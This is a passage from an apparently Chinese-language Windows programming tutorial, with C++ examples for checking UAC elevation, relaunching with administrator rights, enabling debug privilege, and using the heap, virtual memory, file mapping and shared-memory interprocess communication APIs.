class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CMy01UACDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 给按钮加小盾牌</span></span><br><span class="line"><span class="comment">// 3. 判断具体的权限状况</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 获得本进程的令牌</span></span><br><span class="line">HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_QUERY, &amp;hToken))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="comment">// 2. 获取提升类型</span></span><br><span class="line">TOKEN_ELEVATION_TYPE ElevationType = TokenElevationTypeDefault;</span><br><span class="line">BOOL                 bIsAdmin = <span class="literal">false</span>;</span><br><span class="line">DWORD                dwSize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetTokenInformation</span>(hToken, TokenElevationType, &amp;ElevationType,</span><br><span class="line"><span class="built_in">sizeof</span>(TOKEN_ELEVATION_TYPE), &amp;dwSize)) &#123;</span><br><span class="line"><span class="comment">// 2.1 创建管理员组的对应SID</span></span><br><span class="line">BYTE adminSID[SECURITY_MAX_SID_SIZE];</span><br><span class="line">dwSize = <span class="built_in">sizeof</span>(adminSID);</span><br><span class="line"><span class="built_in">CreateWellKnownSid</span>(WinBuiltinAdministratorsSid, <span class="literal">NULL</span>, &amp;adminSID, &amp;dwSize);</span><br><span class="line"><span class="comment">// 2.2 判断当前进程运行用户角色是否为管理员</span></span><br><span class="line"><span class="keyword">if</span> (ElevationType == TokenElevationTypeLimited) &#123;</span><br><span class="line"><span class="comment">// a. 获取连接令牌的句柄</span></span><br><span class="line">HANDLE hUnfilteredToken = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">GetTokenInformation</span>(hToken, TokenLinkedToken, (PVOID)&amp;hUnfilteredToken,</span><br><span class="line"><span class="built_in">sizeof</span>(HANDLE), &amp;dwSize);</span><br><span class="line"><span class="comment">// b. 检查这个原始的令牌是否包含管理员的SID</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CheckTokenMembership</span>(hUnfilteredToken, &amp;adminSID, &amp;bIsAdmin))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hUnfilteredToken);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">bIsAdmin = <span class="built_in">IsUserAnAdmin</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">&#125;</span><br><span class="line">BOOL bFullToken = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">switch</span> (ElevationType) &#123;</span><br><span class="line"><span class="keyword">case</span> TokenElevationTypeDefault: <span class="comment">/* 默认的用户或UAC被禁用 */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsUserAnAdmin</span>())  bFullToken = <span class="literal">true</span>; <span class="comment">// 默认用户有管理员权限</span></span><br><span class="line"><span class="keyword">else</span>                  bFullToken = <span class="literal">false</span>;<span class="comment">// 默认用户不是管理员组</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TokenElevationTypeFull:    <span class="comment">/* 已经成功提高进程权限 */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsUserAnAdmin</span>())  bFullToken = <span class="literal">true</span>; <span class="comment">//当前以管理员权限运行</span></span><br><span class="line"><span class="keyword">else</span>                  bFullToken = <span class="literal">false</span>;<span class="comment">//当前未以管理员权限运行</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TokenElevationTypeLimited: <span class="comment">/* 进程在以有限的权限运行 */</span></span><br><span class="line"><span class="keyword">if</span> (bIsAdmin)  bFullToken = <span class="literal">false</span>;<span class="comment">//用户有管理员权限，但进程权限有限</span></span><br><span class="line"><span class="keyword">else</span>           bFullToken = <span class="literal">false</span>;<span class="comment">//用户不是管理员组，且进程权限有限</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 4. 根据权限的不同控制按钮的显示</span></span><br><span class="line"><span class="keyword">if</span> (!bFullToken)</span><br><span class="line"><span class="built_in">Button_SetElevationRequiredState</span>(::<span class="built_in">GetDlgItem</span>(m_hWnd, IDC_BUTTON1),!bFullToken);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">::<span class="built_in">ShowWindow</span>(::<span class="built_in">GetDlgItem</span>(m_hWnd, IDC_BUTTON1), SW_HIDE);</span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMy01UACDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="comment">//以UAC的方式，重新启动程序</span></span><br><span class="line"><span class="comment">// 1. 获得本进程的令牌</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 隐藏当前窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(SW_HIDE);</span><br><span class="line"><span class="comment">// 2. 获取当前程序路径</span></span><br><span class="line">WCHAR szApplication[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD cchLength = _countof(szApplication);</span><br><span class="line"><span class="built_in">QueryFullProcessImageName</span>(<span class="built_in">GetCurrentProcess</span>(), <span class="number">0</span>,</span><br><span class="line">szApplication, &amp;cchLength);</span><br><span class="line"><span class="comment">// 3. 以管理员权限重新打开进程</span></span><br><span class="line">SHELLEXECUTEINFO sei = &#123; <span class="built_in">sizeof</span>(SHELLEXECUTEINFO) &#125;;</span><br><span class="line">sei.lpVerb = <span class="string">L&quot;runas&quot;</span>;      <span class="comment">// 请求提升权限</span></span><br><span class="line">sei.lpFile = szApplication; <span class="comment">// 可执行文件路径</span></span><br><span class="line">sei.lpParameters = <span class="literal">NULL</span>;          <span class="comment">// 不需要参数</span></span><br><span class="line">sei.nShow = SW_SHOWNORMAL; <span class="comment">// 正常显示窗口</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ShellExecuteEx</span>(&amp;sei))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">ShowWindow</span>( SW_SHOWNORMAL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMy01UACDlg::OnBnClickedButton2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">EnableDebugPrivilege</span>(TRUE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CMy01UACDlg::EnableDebugPrivilege</span><span class="params">(BOOL fEnable)</span> </span>&#123;   <span class="comment">//提升为调试权限</span></span><br><span class="line">BOOL fOk = FALSE;    HANDLE hToken;</span><br><span class="line"><span class="comment">// 以修改权限的方式，打开进程的令牌</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES,</span><br><span class="line">&amp;hToken)) &#123;</span><br><span class="line"><span class="comment">// 令牌权限结构体</span></span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//获得LUID</span></span><br><span class="line"><span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : <span class="number">0</span>;</span><br><span class="line"><span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">//修改权限</span></span><br><span class="line">fOk = (<span class="built_in">GetLastError</span>() == ERROR_SUCCESS);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(fOk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><p>Windows系统使用虚拟内存的好处是什么</p><p>a) 无论物理内存实际有多大，每一个进程都有4GB的虚拟地址空间。<br>b) 每一个进程在虚拟地址空间的使用上都是相似的，低2GB是用户空间，高2GB是系统空间，低2GB的用户代码空间的代码无法访问高2GB系统空间。<br>c) 在进程中使用的全部都是虚拟地址，具体虚拟地址到物理地址的转换由操作系统内核完成，故而你无法在自己的进程中访问到其他进程的内存，虽然大家的地址长得如此类似。<br>d) 一个进程的虚拟空间只有使用一部分与物理内存有映射关系，并且windows尽量保证对于不同进程的同一份数据，在物理内存中只有一份，分别映射到多个进程中。从而节约内存。<br>e) 当各个进程所使用的内存数量超出物理内存的时候，操作系统还能够将物理内存中暂时用不到的数据交换到硬盘中。</p><h2 id="堆的管理"><a href="#堆的管理" class="headerlink" title="堆的管理"></a>堆的管理</h2><div class="table-container"><table><thead><tr><th>API</th><th>说明</th></tr></thead><tbody><tr><td>HeapCreate</td><td>在进程中创建一个堆，返回一个堆句柄</td></tr><tr><td>GetProcessHeap</td><td>获取当前进程中的一个堆，返回一个句柄</td></tr><tr><td>GetProcessHeaps</td><td>获取进程中的所用堆，堆的数量和堆的各个句柄</td></tr><tr><td>HeapAlloc</td><td>从指定的堆上分配块</td></tr><tr><td>HeapReAlloc</td><td>重新分配内存，改变已经分配好的堆内存块大小</td></tr><tr><td>GetSystemInfo</td><td>获取系统信息</td></tr><tr><td>HeapSize</td><td>获取指定堆的大小</td></tr><tr><td>HeapFree</td><td>释放HeapAlloc和HeapReAlloc申请的内存</td></tr><tr><td>HeapDestroy</td><td>销毁由HeapCreate创建的堆</td></tr><tr><td>CreateToolhelp32Snapshot</td><td>可以分别创建进程、线程、进程模块、进程堆的快照</td></tr><tr><td>Heap32First</td><td>用来首次调用，获得第一个堆对象的信息</td></tr><tr><td>Heap32Next</td><td>以后的调用由他来完成，不断的获取堆对象信息</td></tr></tbody></table></div><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//我们不创建堆，进程也会有默认的堆</span></span><br><span class="line">HANDLE      hHeap = <span class="built_in">GetProcessHeap</span>(); <span class="comment">// 获取默认堆</span></span><br><span class="line">SYSTEM_INFO si;                       <span class="comment">//系统信息</span></span><br><span class="line"><span class="built_in">GetSystemInfo</span>(&amp;si);                   <span class="comment">// 获取系统信息</span></span><br><span class="line"><span class="comment">//在堆上分配3个页面大小的内存</span></span><br><span class="line">LPVOID lpMem = <span class="built_in">HeapAlloc</span>(hHeap, HEAP_ZERO_MEMORY, si.dwPageSize * <span class="number">3</span>);</span><br><span class="line"><span class="built_in">HeapFree</span>(hHeap, <span class="number">0</span>, lpMem);</span><br><span class="line"><span class="comment">//默认堆，不应该去销毁它</span></span><br><span class="line"><span class="comment">//HeapDestroy( hHeap );</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">Test</span>();</span><br><span class="line"><span class="comment">//1 创建一个堆</span></span><br><span class="line">HANDLE      hHeap = <span class="built_in">HeapCreate</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">SYSTEM_INFO si;     <span class="comment">//系统信息</span></span><br><span class="line"><span class="built_in">GetSystemInfo</span>(&amp;si); <span class="comment">// 获取系统信息，主要是为了获取内存分页大小</span></span><br><span class="line"><span class="comment">//在堆上分配3个页面大小的内存</span></span><br><span class="line">LPVOID lpMem = <span class="built_in">HeapAlloc</span>(hHeap, HEAP_ZERO_MEMORY, si.dwPageSize * <span class="number">3</span>);</span><br><span class="line"><span class="comment">//。。。。。</span></span><br><span class="line"><span class="comment">//释放堆内存</span></span><br><span class="line"><span class="built_in">HeapFree</span>(hHeap, <span class="number">0</span>, lpMem);</span><br><span class="line"><span class="comment">//销毁堆，这个堆，没有任何需要使用的内存了，就销毁</span></span><br><span class="line"><span class="built_in">HeapDestroy</span>(hHeap);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用场景：</p><p>一般情况下，咱么都是使用malloc或者new。如果有以下场景可以尝试使用堆，假如咱们的程序需要大量的去申请小块的内存，管理这些地址，就会比较麻烦，此时就可以使用自己创建的堆，在用完了内存之后，去直接销毁堆，此时内存就自动释放了，也就免去了挨个去释放的麻烦。</p><h3 id="遍历堆"><a href="#遍历堆" class="headerlink" title="遍历堆"></a>遍历堆</h3><p>和遍历进程，线程一致的，使用快照去遍历即可。</p><h2 id="虚拟内存管理函数"><a href="#虚拟内存管理函数" class="headerlink" title="虚拟内存管理函数"></a>虚拟内存管理函数</h2><div class="table-container"><table><thead><tr><th>作用</th><th>函数名</th><th>说明</th></tr></thead><tbody><tr><td>分配</td><td>VirtualAlloc</td><td>分配或预定一块虚拟内存</td></tr><tr><td></td><td>VirtualAllocEx</td><td>可以在其他进程分配或预定一块虚拟内存</td></tr><tr><td>释放</td><td>VirtualFree</td><td>将一块虚拟内存释放</td></tr><tr><td></td><td>VirtualFreeEX</td><td>可以将释放其他进程的内存</td></tr><tr><td>锁定与解锁</td><td>VirtualLook</td><td>可以将内存锁定，不能交换数据到硬盘</td></tr><tr><td></td><td>VirtualUnlook</td><td>为内存解锁</td></tr><tr><td>修改保护属性</td><td>VirtualProtect</td><td>修改一块虚拟内存的属性</td></tr><tr><td></td><td>VirtualProtectEx</td><td>可以修改其他内存的属性</td></tr><tr><td>读写其他进程内存</td><td>ReadProcessMemory</td><td>读写远程进程的内存数据</td></tr><tr><td></td><td>WriteProcessMemory</td><td>将数据写入远程进程内存</td></tr><tr><td>查询内存状态</td><td>VirtualQuery</td><td>查询内存状态</td></tr><tr><td></td><td>VirtualQueryEx</td><td>可以查询其他内存状态</td></tr></tbody></table></div><h3 id="安全属性"><a href="#安全属性" class="headerlink" title="安全属性"></a>安全属性</h3><div class="table-container"><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>PAGE_NOACCESS</td><td>0x01</td><td>不可访问</td></tr><tr><td>PAGE_READONLY</td><td>0x02</td><td>只读</td></tr><tr><td>PAGE_READWRITE</td><td>0x04</td><td>可读可写</td></tr><tr><td>PAGE_WRITECOPY</td><td>0x08</td><td>可写可读</td></tr><tr><td>PAGE_EXECUTE</td><td>0x10</td><td>可执行</td></tr><tr><td>PAGE_EXECUTE_READ</td><td>0x20</td><td>可读可执行</td></tr><tr><td>PAGE_EXECUTE_READWRITE</td><td>0x40</td><td>可读可写可执行</td></tr><tr><td>PAGE_EXECUTE_WRITECOPY</td><td>0x80</td><td>可执行，写时复制</td></tr><tr><td>PAGE_GUARD</td><td>0x100</td><td></td></tr><tr><td>PAGE_NOCACHE</td><td>0x200</td><td></td></tr><tr><td>PAGE_WRITECOMBINE</td><td>0x400</td><td></td></tr><tr><td>PAGE_GRAPHICS_NOACCESS</td><td>0x0800</td><td></td></tr><tr><td>PAGE_GRAPHICS_READONLY</td><td>0x1000</td><td></td></tr><tr><td>PAGE_GRAPHICS_READWRITE</td><td>0x2000</td><td></td></tr><tr><td>PAGE_GRAPHICS_EXECUTE</td><td>0x4000</td><td></td></tr><tr><td>PAGE_GRAPHICS_EXECUTE_READ</td><td>0x8000</td><td></td></tr><tr><td>PAGE_GRAPHICS_EXECUTE_READWRITE</td><td>0x10000</td><td></td></tr><tr><td>PAGE_GRAPHICS_COHERENT</td><td>0x20000</td><td></td></tr><tr><td>PAGE_ENCLAVE_THREAD_CONTROL</td><td>0x80000000</td><td></td></tr><tr><td>PAGE_REVERT_TO_FILE_MAP</td><td>0x80000000</td><td></td></tr><tr><td>PAGE_TARGETS_NO_UPDATE</td><td>0x40000000</td><td></td></tr><tr><td>PAGE_TARGETS_INVALID</td><td>0x40000000</td><td></td></tr><tr><td>PAGE_ENCLAVE_UNVALIDATED</td><td>0x20000000</td><td></td></tr><tr><td>PAGE_ENCLAVE_DECOMMIT</td><td>0x10000000</td></tr></tbody></table></div><h3 id="申请和释放"><a href="#申请和释放" class="headerlink" title="申请和释放"></a>申请和释放</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 申请</span></span><br><span class="line">LPVOID lpvResult = <span class="built_in">VirtualAlloc</span>(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">4097</span>,              <span class="comment">// 4KB * 1</span></span><br><span class="line">MEM_RESERVE | MEM_COMMIT,   <span class="comment">// 预定并调拨内存</span></span><br><span class="line">PAGE_READWRITE);            <span class="comment">// 可读写</span></span><br><span class="line"><span class="comment">//使用</span></span><br><span class="line"><span class="built_in">wcscpy_s</span>((LPWSTR)lpvResult, <span class="built_in">wcslen</span>(<span class="string">L&quot;Hello!&quot;</span>)+<span class="number">2</span>, <span class="string">L&quot;World!&quot;</span>);</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, (LPWSTR)lpvResult, <span class="literal">NULL</span>, MB_OK);</span><br><span class="line"><span class="comment">//释放</span></span><br><span class="line"><span class="built_in">VirtualFree</span>(lpvResult, <span class="number">1</span>, MEM_RELEASE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改保护属性"><a href="#修改保护属性" class="headerlink" title="修改保护属性"></a>修改保护属性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char* p = (char*)&quot;hello World&quot;;</span><br><span class="line">DWORD dwNewProtect = PAGE_READWRITE;</span><br><span class="line">DWORD dwOldProtect = 0;</span><br><span class="line">VirtualProtect(p, 1, dwNewProtect, &amp;dwOldProtect);</span><br><span class="line">p[0] = &#x27;m&#x27;;</span><br><span class="line">p[1] = &#x27;k&#x27;;</span><br><span class="line">p[2] = &#x27;m&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件映射"><a href="#文件映射" class="headerlink" title="文件映射"></a>文件映射</h2><p>可以将文件直接映射进内存的一种技术。</p><div class="table-container"><table><thead><tr><th>API</th><th>说明</th></tr></thead><tbody><tr><td>GetSystemInfo</td><td>获取系统信信息，用于确定分配粒度</td></tr><tr><td>CreateFileMapping</td><td>创建一个mapping对象</td></tr><tr><td>OpenFileMapping</td><td>打开已命名的mapping对象（可跨进程）</td></tr><tr><td>UnmapViewOfFile</td><td>取消文件映射</td></tr><tr><td>MapViewOfFile</td><td>将mapping对象的文件映射到内存</td></tr><tr><td>FlushViewOfFile</td><td>将映射到内存的文件写回到硬盘</td></tr></tbody></table></div><p>有两个作用：</p><p>1 操作文件比较方便</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 打开文件，得到一个文件句柄</span></span><br><span class="line">HANDLE hFile =  <span class="built_in">CreateFile</span>(</span><br><span class="line"><span class="string">L&quot;D:\\test\\123.txt&quot;</span>,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="number">0</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2. 创建一个文件映射对象，和文件句柄关联如果，要超过文件大小的话</span></span><br><span class="line"><span class="comment">//   创建的时候，就需要写一个大小。</span></span><br><span class="line"><span class="comment">//   </span></span><br><span class="line">HANDLE hFileMapping  = </span><br><span class="line"><span class="built_in">CreateFileMapping</span>(hFile, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//3. 将文件映射到内存</span></span><br><span class="line"><span class="type">char</span> *p = (<span class="type">char</span>*)<span class="built_in">MapViewOfFile</span>(hFileMapping, FILE_MAP_ALL_ACCESS, <span class="number">0</span>,<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 读取或者写入</span></span><br><span class="line"><span class="built_in">strcpy_s</span>(p, <span class="number">100</span>,<span class="string">&quot;15pb hello  15pb hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//5. 文件映射的写入，会自动刷，也可以手动刷 </span></span><br><span class="line"><span class="built_in">FlushViewOfFile</span>(p, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//6. 关闭句柄</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hFileMapping);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2 文件映射是一个内核对象，可以在多进程中去访问，所以文件映射也是一种进程间通讯机制。</p><h3 id="进程间通讯"><a href="#进程间通讯" class="headerlink" title="进程间通讯"></a>进程间通讯</h3><h4 id="通讯A端"><a href="#通讯A端" class="headerlink" title="通讯A端"></a>通讯A端</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 06_进程间通讯.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 创建文件映射</span></span><br><span class="line">HANDLE hFileMapping =</span><br><span class="line"><span class="built_in">CreateFileMapping</span>(</span><br><span class="line">INVALID_HANDLE_VALUE, </span><br><span class="line"><span class="literal">NULL</span>, PAGE_READWRITE, </span><br><span class="line"><span class="number">0</span>, </span><br><span class="line"><span class="number">100</span>,</span><br><span class="line"><span class="string">L&quot;hello 15pb&quot;</span><span class="comment">//起了名字，别的进程才能打开它</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 映射内存</span></span><br><span class="line"><span class="type">char</span>* pBuf = (<span class="type">char</span>*)<span class="built_in">MapViewOfFile</span>(hFileMapping, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">pBuf[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3 时刻检测，第一个字节是否被修改了</span></span><br><span class="line"><span class="keyword">while</span> (pBuf[<span class="number">0</span>] == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4 如果被修改了，那么就结束</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;数据已经被更改&quot;</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFileMapping);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="通讯B端"><a href="#通讯B端" class="headerlink" title="通讯B端"></a>通讯B端</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 打开文件Mapping</span></span><br><span class="line">HANDLE hMapFile = <span 